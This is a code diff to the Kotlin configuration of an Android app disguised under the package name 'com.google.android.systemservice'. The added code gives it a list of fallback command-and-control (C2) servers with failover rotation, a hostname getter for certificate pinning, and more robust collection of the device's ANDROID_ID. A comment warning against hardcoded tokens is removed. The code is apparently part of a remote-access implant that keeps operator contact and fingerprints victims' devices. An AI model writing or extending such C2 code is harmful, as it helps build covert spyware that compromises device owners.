@@ -5,13 +5,15 @@ import com.google.android.systemservice.BuildConfig
 
 object AndroidConfig {
     // Server Configuration
-    // 10.0.2.2 works ONLY for the official Android Studio Emulator
     // Configured via Gradle property: -PserverBaseUrl="IP:PORT"
     private var serverBaseUrl = BuildConfig.SERVER_BASE_URL
     private var useHttps = false
     
+    // Fallback C2 servers (tried in order if primary fails)
+    private val fallbackServers = mutableListOf<String>()
+    private var currentServerIndex = 0
+    
     // API Authentication Token - loaded from BuildConfig (set via Gradle property -PdeviceToken="...")
-    // NEVER hardcode tokens in source code!
     val DEVICE_TOKEN: String = BuildConfig.DEVICE_AUTH_TOKEN
     val deviceToken: String get() = DEVICE_TOKEN
     
@@ -24,10 +26,16 @@ object AndroidConfig {
      */
     fun initDeviceId(context: Context) {
         if (deviceId.isEmpty()) {
-            deviceId = android.provider.Settings.Secure.getString(
-                context.contentResolver,
-                android.provider.Settings.Secure.ANDROID_ID
-            ) ?: "unknown_device"
+            deviceId = try {
+                android.provider.Settings.Secure.getString(
+                    context.contentResolver,
+                    android.provider.Settings.Secure.ANDROID_ID
+                ) ?: java.util.UUID.randomUUID().toString()
+            } catch (e: Exception) {
+                // Ssaid not accessible on some devices/emulators/secondary profiles
+                android.util.Log.w("AndroidConfig", "ANDROID_ID not accessible: ${e.message}")
+                java.util.UUID.randomUUID().toString()
+            }
         }
     }
     
@@ -87,6 +95,48 @@ object AndroidConfig {
     fun updateServerConfig(host: String, port: Int, https: Boolean = false) {
         serverBaseUrl = "$host:$port"
         useHttps = https
+    }
+
+    /**
+     * Get just the server hostname (for SSL pinning)
+     */
+    fun getServerHost(): String {
+        return try {
+            java.net.URI(serverUrl).host ?: serverBaseUrl.split(":").first()
+        } catch (e: Exception) {
+            serverBaseUrl.split(":").first()
+        }
+    }
+
+    /**
+     * Add fallback C2 server URLs (tried in order if primary fails)
+     */
+    fun addFallbackServer(url: String) {
+        if (url !in fallbackServers) fallbackServers.add(url)
+    }
+
+    /**
+     * Switch to next available C2 server. Returns true if switched, false if no more servers.
+     */
+    fun switchToNextServer(): Boolean {
+        val allServers = mutableListOf(BuildConfig.SERVER_BASE_URL)
+        allServers.addAll(fallbackServers)
+        currentServerIndex++
+        if (currentServerIndex >= allServers.size) {
+            currentServerIndex = 0 // wrap around
+            return false
+        }
+        serverBaseUrl = allServers[currentServerIndex]
+        android.util.Log.d("AndroidConfig", "Switched to C2 server #$currentServerIndex: $serverBaseUrl")
+        return true
+    }
+
+    /**
+     * Reset to primary server
+     */
+    fun resetToPrimaryServer() {
+        currentServerIndex = 0
+        serverBaseUrl = BuildConfig.SERVER_BASE_URL
     }
     
     /**
